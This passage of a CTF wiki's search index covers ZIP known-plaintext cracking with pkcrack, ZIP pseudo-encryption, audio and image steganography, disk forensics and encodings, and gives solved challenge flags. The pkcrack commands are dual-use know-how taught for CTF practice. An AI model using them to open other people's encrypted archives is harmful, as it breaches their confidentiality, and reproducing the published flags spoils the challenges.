as the one in <code>Desktop.zip</code>.</p> <p>Base on that information, we can safely guess the extracted <code>readme.txt</code> file is the plaintext of encrypted <code>readme.txt</code> in <code>Desktop.zip</code>.</p> <p></p> <p>Step 3, try plaintext attack</p> <p>Now that we know that it is a plaintext attack, we will crack the encrypted compressed file. Since the extracted readme.txt is the plaintext of <code>readme.txt</code> in the encrypted archive, compress <code>readme.txt</code> to a .zip file.</p> <p>We are going to use <code>pkcrack</code>, to install it save the following script to <code>pkcrack-install.sh</code> and run it to the current directory, giving it an execute permission.</p> <pre><code>#!/bin/bash -ex\n\nwget https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/pkcrack-1.2.2.tar.gz\ntar xzf pkcrack-1.2.2.tar.gz\ncd pkcrack-1.2.2/src\nmake\nmkdir -p ../../bin\ncp extract findkey makekey pkcrack zipdecrypt ../../bin\ncd ../../\n</code></pre> <p></p> <p>Then a folder of <code>bin</code> will be generated in the current directory. We will directly enter the <code>bin</code> folder and see the <code>pkcrack</code> file, which be used for cracking.</p> <pre><code>./pkcrack -c readme.txt -p readme.txt -C ~/download/misc/Desktop.zip -P ~/download/misc/readme.zip -d ~/decrypt.zip\n</code></pre> <p>The parameter options we used are as follows:</p> <pre><code>-C: target file to be cracked or encrypted file\n-c: name of ciphertext file within the encrypted file (readme.txt in Desktop.zip)\n-P: compressed plaintext file\n-p: name of the plaintext file in the compressed plaintext file (that is, the location of readme.txt in readme.zip)\n-d: name of the output decrypted zip file\n</code></pre> <p>For other options see <code>./pkcrack --help</code></p> <p>The results after decryption are as follows:</p> <p></p> <p></p> <p></p> <p></p> <p>We can see that we started running at <code>1:10</code> in the afternoon and solved the secret key in the afternoon at <code>3:27</code>. So, the cracking can take a bit.</p> <p>flag: <code>flag{7ip_Fi13_S0m3tim3s_s0_3a5y@}</code></p>"},{"location":"misc/archive/zip/#pseudo-encryption","title":"Pseudo encryption","text":""},{"location":"misc/archive/zip/#basics_2","title":"Basics","text":"<p>In the central directory in the <code>ZIP</code> format above, we emphasize there is <code>2 byte</code> for the general-purpose bit flag. different bits have different meanings.</p> <pre><code>Bit 0: If set, indicates that the file is encrypted.\n\n(For Method 6 - Imploding)\n\nBit 1: If the compression method used was type 6,\n\n     Imploding, then this bit, if set, indicates\n\n     an 8K sliding dictionary was used.  If clear,\n\n     then a 4K sliding dictionary was used.\n...\n\nBit 6: Strong encryption.  If this bit is set, you should\n\n     set the version needed to extract value to at least\n\n     50 and you must also set bit 0.  If AES encryption\n\n     is used, the version needed to extract value must\n\n     be at least 51.\n...\n</code></pre> <p>In <code>010Editor</code> we tried to modify this general purpose bit from <code>0 --&gt; 1</code>.</p> <p></p> <p>Open the file again, it now requires a password.</p> <p></p> <p>Modify pseudo-encryption method:</p> <ul> <li>Modify the general purpose bit in hex</li> <li><code>binwalk -e</code> ignores pseudo encryption</li> <li>In the <code>Mac OS</code> and some <code>Linux</code> (such as <code>Kali</code>), you can open the pseudo-encrypted <code>ZIP</code></li> <li>Detect pseudo-encrypted with <code>ZipCenOp.jar</code> tool</li> <li>Sometimes you can use <code>WinRar</code>'s repair feature</li> </ul>"},{"location":"misc/archive/zip/#references","title":"References","text":"<ul> <li> <p>https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt</p> </li> <li> <p>https://www.cnblogs.com/ECJTUACM-873284962/p/9387711.html</p> </li> <li> <p>https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html</p> </li> <li> <p>http://bobao.360.cn/ctf/detail/197.html</p> </li> </ul>"},{"location":"misc/audio/introduction/","title":"Audio Steganography","text":"<p>The audio-related CTF challenges mainly use steganography techniques, involving MP3, LSB, waveform, spectrum steganography.</p>"},{"location":"misc/audio/introduction/#common-method","title":"Common Method","text":"<p>Finding and extracting information using  <code>binwalk</code> and <code>strings</code> commands, details are not converted.</p>"},{"location":"misc/audio/introduction/#mp3-steganography","title":"MP3 Steganography","text":""},{"location":"misc/audio/introduction/#basics","title":"Basics","text":"<p>MP3 steganography is using the MP3stego tool to hide information. The basic introduction and usage are as follows:</p> <p>MP3Stego will hide information in MP3 files during the compression process. The data is first compressed, encrypted and then hidden in the MP3 bit stream.</p> <pre><code>encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3\ndecode -X -P pass svega_stego.mp3\n</code></pre>"},{"location":"misc/audio/introduction/#ctf-example","title":"CTF Example","text":""},{"location":"misc/audio/introduction/#iscc-2016-music-never-sleep","title":"ISCC-2016: Music Never Sleep","text":"<p>After the initial observation, no flag was found with <code>strings</code> and the audio was normal. so steganography tool was likely used to hide the flag.</p> <p></p> <p>After decoding using <code>Mp3Stego</code> with the password found earlier.</p> <pre><code>decode.exe -X ISCC2016.mp3 -P bfsiscc2016\n</code></pre> <p>We got the file <code>iscc2016.mp3.txt</code>:</p> <pre><code>Flag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ== ???\n</code></pre> <p>After decoding the encoded string from base64 and base32, we got the flag.</p>"},{"location":"misc/audio/introduction/#waveform","title":"Waveform","text":""},{"location":"misc/audio/introduction/#basics_1","title":"Basics","text":"<p>--..----.----.</p> <p>Generally speaking, we want to observe the waveform pattern of an audio file to find something strange. We can use tools like Audacity or Adobe Audition to do that. After the waveform pattern, see if you can convert part of the waveform into binary strings (1s and 0s). See</p>"},{"location":"misc/audio/introduction/#ctf-example_1","title":"CTF Example","text":""},{"location":"misc/audio/introduction/#iscc-2017-misc-04","title":"ISCC-2017: Misc-04","text":"<p>In fact, the hidden information in this challenge is in the first part of the audio. If you don't listen carefully, you may mistake it for steganography.</p> <p>Download the challenge here</p> <p></p> <p>The high is 1, and the low is 0, representing a binary string (1s and 0s).</p> <pre><code>110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101\n</code></pre> <p>Convert to ASCII. Note that one group of binary must be 7 bits because the length of the binary string is 105, it can't divide into 8 bits evenly (105 mod 8 is 1), however, it does divide into 7 (105 mod 7 is 0).</p>"},{"location":"misc/audio/introduction/#spectrum","title":"Spectrum","text":""},{"location":"misc/audio/introduction/#basics_2","title":"Basics","text":"<p>Spectrum stenography is hiding strings in the audio spectrum. One distant feature is that it often contains noisy or harsh sounds.</p>"},{"location":"misc/audio/introduction/#ctf-example_2","title":"CTF Example","text":""},{"location":"misc/audio/introduction/#su-ctf-quals-2014-hear_with_your_eyes","title":"Su CTF Quals 2014: hear_with_your_eyes","text":"<p>Download the challenge here</p> <p>Open the audio in <code>Audacity</code>and view the spectrogram.</p> <p></p>"},{"location":"misc/audio/introduction/#lsb-audio-steganography","title":"LSB Audio Steganography","text":""},{"location":"misc/audio/introduction/#basics_3","title":"Basics","text":"<p>Similar to LSB in image steganography, you can also perform LSB steganography in audio. we can use the SilentEye tool to solve audio LSB challenges.</p> <p>Description of SilentEye:</p> <p>SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.</p>"},{"location":"misc/audio/introduction/#2015-gdqwb-little-apple","title":"2015 GDQWB: Little Apple","text":"<p>Just use <code>slienteye</code>'s decode feature.</p> <p></p>"},{"location":"misc/audio/introduction/#related-ctfs-and-resources","title":"Related CTFs and Resources","text":"<ul> <li>LSB in Audio - DerbyCon CTF</li> <li>Manchester code - Wikipedia</li> </ul>"},{"location":"misc/disk-memory/introduction/","title":"Introduction","text":""},{"location":"misc/disk-memory/introduction/#common-tools","title":"Common tools","text":"<ul> <li>EasyRecovery</li> <li>MedAnalyze</li> <li>FTK</li> <li>Volatility</li> </ul>"},{"location":"misc/disk-memory/introduction/#disk","title":"Disk","text":"<p>Common disk partition formats are as follows</p> <ul> <li> <p>Windows: FAT12 -&gt; FAT16 -&gt; FAT32 -&gt; NTFS</p> </li> <li> <p>Linux: EXT2 -&gt; EXT3 -&gt; EXT4</p> </li> <li> <p>FAT file structure</p> <p>| Boot Sector | File Allocation Table | Root Directory | File Data Region</p> </li> <li> <p>Delete file: The first byte of the file name in the directory table is <code>e5</code>.</p> </li> </ul>"},{"location":"misc/disk-memory/introduction/#vmdk","title":"VMDK","text":"<p>VMDK files are essentially a virtual version of the physical hard disk. It can also exist with the physical hard disk partition and sector of similar filled areas. We can use these filled areas to hide data. You can avoid the hidden files increasing the size of the VMDK files and virtual machine errors that may result from changes in the size of VMDK files. Also, VMDK files are generally large, so it\u2019s suitable for hiding large files.</p>"},{"location":"misc/disk-memory/introduction/#ram","title":"RAM","text":"<ul> <li>Analyze Windows / Linux / Mac OS X memory structure</li> <li>Analyze processes, memory data</li> <li>Use the given challenge prompt to extract specific memory data for the specified process.</li> </ul>"},{"location":"misc/disk-memory/introduction/#ctf-example","title":"CTF Example","text":""},{"location":"misc/disk-memory/introduction/#2018-net-ding-cup-clip","title":"2018 Net Ding Cup - clip","text":"<p>Download the challenge file here</p> <p>Through the <code>010 hex editor</code>, you can see that the header of the file contains the word cloop. After searching, we found that this is an old linux-compressed device. The problem is that the device is damaged, so we will find a normal one.</p> <p>To compress to get a cloop file, we can run the following command</p> <pre><code>mkisofs -r test | create_compressed_fs - 65536 &gt; test.cloop\n</code></pre> <p>Refer here to compress the file, then we found errors within the file header in the damaged file and fixed it.</p> <p>Here is how to extract files from the cloop file:</p> <pre><code>extract_compressed_fs test.cloop now\n</code></pre> <p>See here for more information.</p> <p>We got an ext4 type file.</p> <p>Next, we need to find a way to get the contents of this file system.</p> <pre><code>\u279c losetup -d /dev/loop0\nlosetup: /dev/loop0: detach failed: Permission denied\n\n\u279c sudo losetup -d /dev/loop0\n\n\u279c sudo losetup /dev/loop0 now                                                 \nlosetup: now: failed to set up loop device: Device or resource busy\n\n\u279c sudo losetup /dev/loop0 /home/iromise/ctf/2018/0820\u7f51\u9f0e\u676f/misc/clip/now        \nlosetup: /home/iromise/ctf/2018/0820\u7f51\u9f0e\u676f/misc/clip/now: failed to set up loop device: Device or resource busy\n\n\u279c losetup -f           \n/ dev / loop10\n\n\u279c sudo losetup /dev/loop10 /home/iromise/ctf/2018/0820\u7f51\u9f0e\u676f/misc/clip/now\n\n\u279c sudo mount /dev/loop10 /mnt/now\n\n\u279c cd /mnt/now\n\n\u279c  ls        \nclip-clip.png  clip-clop.png  clop-clip.png  clop-clop.jpg  flag.png\n</code></pre> <p>The final step is to fix the flag.png header, where some bytes are missing.</p> <p>Flag: <code>flag{0b008070-eb72-4b99-abed-092075d72a40}</code></p>"},{"location":"misc/encode/communication/","title":"Encoding Used in Communication","text":""},{"location":"misc/encode/communication/#phone-dialing-code","title":"Phone Dialing Code","text":"<ul> <li>Phone Keypad Cipher - dcode.fr</li> </ul>"},{"location":"misc/encode/communication/#morse-encoding","title":"Morse Encoding","text":"<ul> <li>Morse Code - Wikipedia</li> </ul> <p>Morse code table: </p>"},{"location":"misc/encode/communication/#features","title":"Features","text":"<ul> <li>Contains only <code>.</code> and <code>-</code>.</li> <li>Maximum of 6 digits.</li> <li>It can also be represented by the <code>01</code> string.</li> </ul>"},{"location":"misc/encode/communication/#tools","title":"Tools","text":"<ul> <li>Morse Code Converter</li> </ul>"},{"location":"misc/encode/communication/#tap-code","title":"Tap Code","text":"<p>Tap code is a simple way to encode the text. Tap code is based on a 5 \u00d75 square Polybius square, but the difference is that letter K is combined with the letter C.</p> Tap Code 1 2 3 4 5 1 A B C/K D E 2 F G H I J 3 L M N O P 4 Q R S T U 5 V W X Y Z <p>Example:</p> Letter F O X Position 2,1 3,4 5,3 Tap Code .. . ... .... ..... ..."},{"location":"misc/encode/communication/#manchester-code","title":"Manchester Code","text":"<ul> <li>Manchester Code - Wikipedia</li> </ul>"},{"location":"misc/encode/communication/#gray-code","title":"Gray Code","text":"<ul> <li>Gray Code - Wikipedia</li> </ul>"},{"location":"misc/encode/computer/","title":"Encoding Used in Computing","text":"<p>This section describes the different encoding used by a computer.</p>"},{"location":"misc/encode/computer/#alphabet-encoding","title":"Alphabet Encoding","text":"<ul> <li>A-Z or a-z corresponds to 1-26 or 0-25</li> </ul>"},{"location":"misc/encode/computer/#tools","title":"Tools","text":"<ul> <li>Letter Numbers Converter</li> </ul>"},{"location":"misc/encode/computer/#ascii-encoding","title":"ASCII encoding","text":""},{"location":"misc/encode/computer/#features","title":"Features","text":"<p>We use ASCII encoding for printable characters, such as the following:</p> <ul> <li> <p>0-9, 49-57</p> </li> <li> <p>A-Z, 65-90</p> </li> <li> <p>a-z, 97-122</p> </li> </ul>"},{"location":"misc/encode/computer/#ascii-conversion","title":"ASCII Conversion","text":""},{"location":"misc/encode/computer/#binary","title":"Binary","text":"<p>Convert ASCII decimal to binary representation.</p> <ul> <li>Only contains 0 and 1</li> <li>No more than 8 bits, 7 bits are also possible because printable characters are up to 127</li> <li>Actually just another form of ASCII code</li> </ul>"},{"location":"misc/encode/computer/#hexadecimal","title":"Hexadecimal","text":"<p>Convert letters to ASCII hexadecimal representation.</p> <ul> <li>A-Z \u2192 41-5a</li> <li>a-z \u2192 61-7a</li> </ul>"},{"location":"misc/encode/computer/#tools_1","title":"Tools","text":"<ul> <li>ASCII,Hex,Binary,Decimal,Base64 Converter</li> </ul>"},{"location":"misc/encode/computer/#ctf-example","title":"CTF Example","text":""},{"location":"misc/encode/computer/#2018-defcon-quals-ghettohackers-throwback","title":"2018 DEFCON Quals - Ghettohackers: Throwback","text":"<p>The challenge details:</p> <pre><code>Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!\n</code></pre> <p>Here we split the given string by <code>!</code> mark, then the length of each string corresponds to a letter. For example, length 1 = a, length 2 = b, and so on.</p> <pre><code>ori = 'Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!'\nsp = ori.split('!')\n# split original text by !\nprint(''.join(chr(97+len(s)-1) if s else ' ' for s in sp))\n# get length of each word and add offset, then convert it to letter with chr()\n</code></pre> <p>We assumed that 0 characters are spaces because it makes the flag readable.</p> <p>The flag is: <code>dark logic</code></p>"},{"location":"misc/encode/computer/#base-encoding","title":"Base Encoding","text":"<p>the <code>xx</code> in base<code>xx</code> indicates how many characters are used for encoding. For example, base64 uses 64 characters to encode since 2 to the sixth power is 64, each 6 bit is an element that corresponds to a printable character. Three bytes have 24 bits, corresponding to four Base64 elements, so three bytes are needed to represent four printable characters. The printable characters in Base64 include the letters A-Z, a-z, numbers 0-9 that are 62 characters and two printable characters differ in different systems.</p> <p></p> <p>Base64 - Wikipedia.</p> <p>Encoding the word  man:</p> <p></p> <p>If the numbers of bytes are not divisible by 3, there will be 1 or 2 extra bytes at the end.</p> <ul> <li>Fill the remaining with value 0 at the end so that it can be divisible by 3, then encode to base64.</li> <li>After it's encoded to base64, you need to add one or two <code>=</code> at the end. When there are 8 bits (one byte) remaining and the last 6 base64 bits contain four values of <code>0</code>, you need to add two <code>=</code> at the end. When there are two bytes remaining and the last 6 base64 bits contain two values of <code>0</code>, you need to add one <code>=</code> at the end.</li> </ul> <p>Refer to the table below: </p> <p>Because the zero paddings are not used in operation, hidden information can be stored there.</p> <p>Similar to base64, base32 uses 32 characters to encode since 2 to the fifth power is 32, each 5 bit is an element that corresponds to a printable character. - If there are less than 5 bit, fill it with <code>0</code> at the end. - Fill the remaining with <code>=</code> until there are 5 bytes. - Base32 can have up to six <code>=</code> at the end.</p> <p>Refer to the table below:</p> <p></p>"},{"location":"misc/encode/computer/#features_1","title":"Features","text":"<ul> <li>Base64 can have <code>=</code> at the end, but two maximum.</li> <li>Base64 can have <code>=</code> at the end, but six maximum.</li> <li>Characters set differ from different bases.</li> <li>It may be necessary to manually add <code>=</code> sign</li> <li><code>=</code> is also 3d (in hex)</li> <li>For more details, see Base RFC</li> </ul>"},{"location":"misc/encode/computer/#tools_2","title":"Tools","text":"<ul> <li>Base64 Decode</li> <li>Base64 Encode</li> <li>Python <code>base64</code> library functions</li> <li>Steganographic Script</li> </ul>"},{"location":"misc/encode/computer/#example","title":"Example","text":"<p>The challenge details can be found in the data.txt file on here</p> <p>Use a script to read steganographic information:</p> <pre><code>import base64\n\ndef deStego (stegoFile):\n    b64table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n\n    with open(stegoFile,'r') as stegoText:\n        message = \"\"\n\n        for line in stegoText:\n            try:\n                text = line[line.index(\"=\") - 1:-1]\n                message += \"\".join([ bin( 0 if i == '=' else b64table.find(i))[2:].zfill(6) for i in text])[2 if text.count('=') ==2 else 4:6]  \n            except:\n                pass\n\n    return \"\".join([chr(int(message[i:i+8],2)) for i in range(0,len(message),8)])\n\nprint(deStego(\"text.txt\"))\n</code></pre> <p>Output: <code>flag{BASE64_i5_amaz1ng}</code></p>"},{"location":"misc/encode/computer/#huffman-coding","title":"Huffman Coding","text":"<p>See Hoffman Coding - Wikipedia</p>"},{"location":"misc/encode/computer/#xxencoding","title":"XXencoding","text":"<p>XXencode encodes the input text in units of three bytes. If the final remaining data is less than three bytes, the missing parts are filled out with zeros. These three bytes have 24 bits in total, divided into four groups of 6 bits, each of which is represented in decimal terms with values that only fall between 0 and 63. Replace the position character of the corresponding value.</p> <pre><code>           1         2         3         4         5         6\n\n 0123456789012345678901234567890123456789012345678901234567890123\n\n |         |         |         |         |         |         |\n\n +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\n</code></pre> <p>See Xxencoding - Wikipedia</p>"},{"location":"misc/encode/computer/#features_2","title":"Features","text":"<ul> <li>only contains numbers and uppercase/lowercase letters</li> <li><code>-</code> sign, <code>-</code> sign</li> </ul>"},{"location":"misc/encode/computer/#tools_3","title":"Tools","text":"<ul> <li>Xxencoding Converter</li> </ul>"},{"location":"misc/encode/computer/#url-encoding","title":"URL Encoding","text":"<p>See URL Encoding - Wikipedia</p>"},{"location":"misc/encode/computer/#features_3","title":"Features","text":"<ul> <li>Many <code>%</code> sign</li> </ul>"},{"location":"misc/encode/computer/#unicode-encoding","title":"Unicode Encoding","text":"<p>See Unicode - Wikipedia</p> <p>Note that it can take four different forms</p>"},{"location":"misc/encode/computer/#example_1","title":"Example","text":"<p>Source text: <code>The</code></p> <p>&amp;#x [Hex]:  <code>&amp;#x0054;&amp;#x0068;&amp;#x0065;</code></p> <p>&amp;# [Decimal]:  <code>&amp;#00084;&amp;#00104;&amp;#00101;</code></p> <p>\\U [Hex]:  <code>\\U0054\\U0068\\U0065</code></p> <p>\\U+ [Hex]:  <code>\\U+0054\\U+0068\\U+0065</code></p>"},{"location":"misc/encode/modern/","title":"Encoding Used in the Real World","text":""},{"location":"misc/encode/modern/#barcode","title":"Barcode","text":"<ul> <li>Graphic identifier representing a set of information, consisting of black bars and white spaces of unequal width, arranged according to different code formats</li> <li>International standards</li> <li>EAN-13 used to identify a specific retail product type, 13 digits</li> <li>Code 39 used in industrial applications, 39 characters</li> <li>Code 128 used in the health industry, blood banking, and electronics manufacture, 128 characters</li> <li>Online Barcode Reader</li> </ul>"},{"location":"misc/encode/modern/#qr-code","title":"QR code","text":"<ul> <li>A black and white graphic that records the data symbol information according to certain rules with a specific geometric figure</li> <li>Recording data symbol information in a black and white pattern in a step-by-step manner with a certain geometry</li> <li>Stacked/Row QR Code: Code 16K, Code 49, PDF417</li> <li> <p>Matrix QR Code: QR Code</p> <p></p> <p></p> </li> </ul>"},{"location":"misc/picture/gif/","title":"GIF","text":""},{"location":"misc/picture/gif/#file-structure","title":"File Structure","text":"<p>The file structure of a GIF file:</p> <ul> <li>File Header</li> <li>File Signature</li> <li>Version Number</li> <li>Data Stream</li> <li>Control Identifier</li> <li>Image Block</li> <li>Other Extension Blocks</li> <li>File Trailer</li> </ul> <p>A diagram for the structure of a GIF file:</p> <p></p>"},{"location":"misc/picture/gif/#file-header","title":"File header","text":"<p>Signature and Version Number. The signature, which consists of three bytes <code>GIF</code>, is used to confirm whether a file is in GIF format. The file version number is also composed of three bytes, <code>87a</code> or <code>89a</code>.</p>"},{"location":"misc/picture/gif/#logical-screen-descriptor","title":"Logical Screen Descriptor","text":"<p>The Logical Screen Descriptor is always located right after the header. This tells the decoder how big the image will be. It is exactly 7 bytes long. It starts with the canvas width and canvas height.</p>"},{"location":"misc/picture/gif/#global-color-table","title":"Global Color Table","text":"<p>The GIF format can have a global color table or local color tables for each sub-image. Each color table contains a list of RGB (Red, Green, Blue) color component intensities, for example, (255\uff0c0\uff0c0) represents red.</p>"},{"location":"misc/picture/gif/#image-descriptor","title":"Image Descriptor","text":"<p>A single GIF file may contain multiple images. In the original GIF rendering model, these were meant to be composited onto a larger virtual canvas. Nowadays multiple images are normally used for animations.</p> <p>Each image begins with an image descriptor block, which is exactly 10 bytes long.</p> <p></p>"},{"location":"misc/picture/gif/#image-data","title":"Image Data","text":"<p>Finally, we get to the actual image data. The image data is composed of a series of output codes that tell the decoder which colors to emit to the canvas. These codes are combined into the bytes that make up the block.</p>"},{"location":"misc/picture/gif/#file-trailer","title":"File Trailer","text":"<p>The trailer block indicates when you've reached the end of the file. It is always a byte <code>3B</code>.</p> <p>For more details, see what is in a GIF</p>"},{"location":"misc/picture/gif/#ctf-examples","title":"CTF Examples","text":""},{"location":"misc/picture/gif/#wdctf-20173-2","title":"WDCTF-2017:3-2","text":"<p>The animation in GIFs is made up of a sequence of frames, each frame can be an image that contains hidden information.</p> <p>You can use the <code>convert</code> command to separate each frame in the GIF file.</p> <p>Run this command to split each frame of the GIF file: <code>ffmpeg -i cake.gif cake-%d.png</code></p> <p>After opening and separating each frame of the GIF image, it's clear that each frame was a part of a QR code, so let's combine the frames into a complete QR code using <code>Python</code>.</p> <pre><code>from  PIL import Image\n\nflag = Image.new(\"RGB\",(450,450))\n\nfor i in range(2):\n    for j in range(2):\n        pot = \"cake-{}.png\".format(j+i*2+1)\n\n        potImage = Image.open(pot)\n\n        crop = potImage.crop(((j * 225, i * 225, (j+1)*225, (i+1)*225)))\n\n        flag.paste(crop, (j * 225, i * 225))     \n\nflag.save('./flag.png')\n</code></pre> <p>After scanning the QR code, you get a string of hexadecimal strings.</p> <p><code>03f30d0ab8c1aa5 .... 74080006030908</code></p> <p>The beginning <code>03f3</code> is the header of a <code>pyc</code> file, restore it to <code>python</code> executable, and run it to get the flag.</p> <p>Here is the decompiled code using uncompyle6:</p> <pre><code># uncompyle6 version 3.7.4\n# Python bytecode 2.7 (62211)\n# Decompiled from: Python 3.7.3 (v3.7.3:ef4ec6ed12, Mar 25 2019, 22:22:05) [MSC v.1916 64 bit (AMD64)]\n# Embedded file name: /home/ctf/bbb.py\n# Compiled at: 2017-09-02 09:35:36\nimport random\n\nkey = 'ctf'\nstrr = '186,98,180,154,139,192,114,14,102,168,43,136,52,218,85,100,43'\n\ndef func1(str1, key):\n    random.seed(key)\n    str2 = ''\n    for c in str1:\n        str2 += str(ord(c) ^ random.randint(0, 255)) + ','\n\n    str2 = str2.strip(',')\n    return str2\n\n\ndef func2(str2, key):\n    random.seed(key)\n    str1 = ''\n    for i in str2.split(','):\n        i = int(i)\n        n = random.randint(0, 255)\n        str1 += chr(i ^ n)\n        print(n)\n\n    return str1\n\nprint(func2(strr,key))\n</code></pre> <p>Note</p> <p>Run the script using Python2</p> <pre><code>python2.7 bbb.py\n\nflag{U_r_Greatt!}\n</code></pre>"},{"location":"misc/picture/gif/#xman-2017100gif","title":"XMAN-2017:100.gif","text":"<p>Download the challenge here</p> <p>The time interval between each frame of a GIF file can also be used to hide information.</p> <p>By using the <code>identify</code> command, we printed the time interval of each frame.</p> <pre><code>$ identify -format \"%s %T \\n\" 100.gif\n\n0 66\n1 66\n2 20\n3 10\n4 20\n5 10\n6 10\n7 20\n8 20\n9 20\n10 20\n11 10\n12 20\n13 20\n14 10\n15 10\n</code></pre> <p>Here we inferred that 20 &amp; 10 represent 0 &amp; 1, each frame interval is extracted and transformed into 1s and 0s.</p> <pre><code>cat flag | cut -d ' ' -f 2 | tr -d '66' | tr -d '\\n' | tr -d '0' | tr '2' '0'\n\n0101100001001101010000010100111001111011001110010011011000110101001101110011010101100010011001010110010101100100001101000110010001100101011000010011000100111000011001000110010101100100001101000011011100110011001101010011011000110100001100110110000101100101011000110110011001100001001100110011010101111101#\n</code></pre> <p>Finally, convert the binary to ASCII to get the flag.</p>"},{"location":"misc/picture/gif/#tools","title":"Tools","text":"<ul> <li>F5-steganography</li> </ul>"},{"location":"misc/picture/introduction/","title":"Introduction to Image Analysis","text":"<p>Image files are a good way to incorporate hacker culture, so a variety of images are used in CTFs.</p> <p>Image files come in a variety of complex formats. Some methods used to solve CTF challenges involve finding metadata and hidden information, decoding lossless compression, checking validation, performing steganography, or extracting printable characters. All of those are important topics of Misc, involving understanding basic file formats, common steganography techniques, and steganography software.</p>"},{"location":"misc/picture/introduction/#metadata","title":"Metadata","text":"<p>Metadata is \"data that provides information about other data\". In other words, it is \"data about data\". Many distinct types of metadata exist, including descriptive metadata, structural metadata, administrative metadata, reference metadata, statistical metadata, and legal metadata.</p> <p>Hiding information in metadata is one of the most basic techniques CTFs, usually used to hide some key information like a <code>hint</code> or <code>password</code>.</p> <p>You can view the metadata of an image by right-clicking on Properties or by using the <code>strings</code> command. In general, some hidden information (strange-looking strings) often appears at the beginning or end of the file.</p> <p>Next, we introduce an <code>identify</code> command, which is used to get the format and characteristics of one or more image files.</p> <p><code>-format</code> is used to specify the information displayed, and the <code>-format</code> option can make a problem easier to solve.</p> <p>For more details, see Format Option Usage</p>"},{"location":"misc/picture/introduction/#ctf-example","title":"CTF Example","text":""},{"location":"misc/picture/introduction/#break-in-2017-mysterious-gif","title":"Break In 2017 - Mysterious GIF","text":"<p>Download the challenge file here</p> <p>One of the difficulties in this problem is to find and extract the metadata in GIF.</p> <p>First, use the <code>strings</code> command to see the text strings and find abnormal text.</p> <pre><code>GIF89a\n   !!!\"\"\"###$$$%%%&amp;&amp;&amp;'''((()))***+++,,,---...///000111222333444555666777888999:::;;;&lt;&lt;&lt;===&gt;&gt;&gt;???@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ[[[\\\\\\]]]^^^___```aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqqqrrrssstttuuuvvvwwwxxxyyyzzz{{{|||}}}~~~\n4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172\nNETSCAPE2.0\nImageMagick\n...\n</code></pre> <p>Here, the strings of hexadecimal are hidden in the GIF metadata.</p> <p>The next step is extraction, you can use Python, but it is more convenient to use <code>identify</code></p> <pre><code>root@linux:~/Desktop/tmp# identify -format \"%s %c \\n\" Question.gif\n0 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172\n1 5832773639712f377933536849507565707478664177525162524f72653330633655772f6f4b3877655a547834346d30414c6f75685634364b63514a6b687271\n...\n24 484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f\n25 724b3052485a6b745062457335797444737142486435504646773d3d\n</code></pre> <p>Other steps are not described here, please refer to the writeup.</p>"},{"location":"misc/picture/introduction/#pixel-values-conversion","title":"Pixel Values Conversion","text":"<p>Look at the data in this file, does it reminds you of anything?</p> <pre><code>255,255,255,255,255...........\n</code></pre> <p>It's a string of RGB values. Let's try to turn it into an image.</p> <pre><code>from PIL import Image\nimport re\n\nx = 307 #x coordinate\ny = 311 #y coordinate  \n# x*y = row number\nrgb1 = [****]\nprint len(rgb1)/3\nm=0\nfor i in xrange(0,x):\n    for j in xrange(0,y):\n\n        line = rgb1[(3*m):(3*(m+1))]# get line\n        m+=1\n        rgb = line\n\n        im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb values converted to pixels\nim.show()\nim.save(\"flag.png\")\n</code></pre> <p>On the other hand, the RGB value is extracted from an image, and then the RGB values are converted to get the final Flag.</p> <p>Most of these questions are pictures composed of pixel blocks, as shown in the figure below:</p> <p></p>"},{"location":"misc/picture/introduction/#related-ctf-challenges","title":"Related CTF Challenges","text":"<ul> <li>CSAW-2016-quals:brainfun</li> <li>breakin-ctf-2017:A-dance-partner</li> </ul>"},{"location":"misc/picture/jpg/","title":"JPG","text":""},{"location":"misc/picture/jpg/#file-structure","title":"File Structure","text":"<ul> <li> <p>JPEG has a lossy compression format, the pixel information is saved into a file and then read out, some of the pixel values will have a little change. There is a quality parameter that can be set between 0 and 100 when saving. The larger the parameter, the more fidelity the picture has. In general, 70 or 80 is sufficient</p> </li> <li> <p>JPEG has no transparency information</p> </li> </ul> <p>There are two basic types of JPG data structures: \"segments\" and compressed encoded image data.</p> Name Number of Bytes Byte Data Description Segment Identification 1 FF Start ID of each new segment Segment Type 1 Type Encoding (called Marker) Segment Length 2 Length of content and segment, excluding segment ID and type Segment Content 2 \u226465533 bytes <ul> <li>Some segment contains no length or content, but just the segment marking and type. File head and end are examples of this.</li> <li>Any amount of <code>FF</code> between segments is valid; these <code>FF</code>'s are called \"padding bytes\" and must be ignored.</li> </ul> <p>Some common segment types:</p> <p></p> <p>Note that a JPG file starts with <code>0xffd8</code> and ends with <code>0xffd9</code>.</p>"},{"location":"misc/picture/jpg/#tools","title":"Tools","text":""},{"location":"misc/picture/jpg/#stegdetect","title":"Stegdetect","text":"<p>Stegdetect is a tool to detect steganography in image files, it supports different methods, which are used to hide content. Currently, the detectable schemes are: jsteg, jphide, invisible secrets, outguess, F5 (header analysis), appendX and camouflage.</p> <p>Additionally, it can also brute force passwords and extract information from Jphide, outguess, and jsteg-shell.</p> <pre><code>-q Only reports images that are likely to have 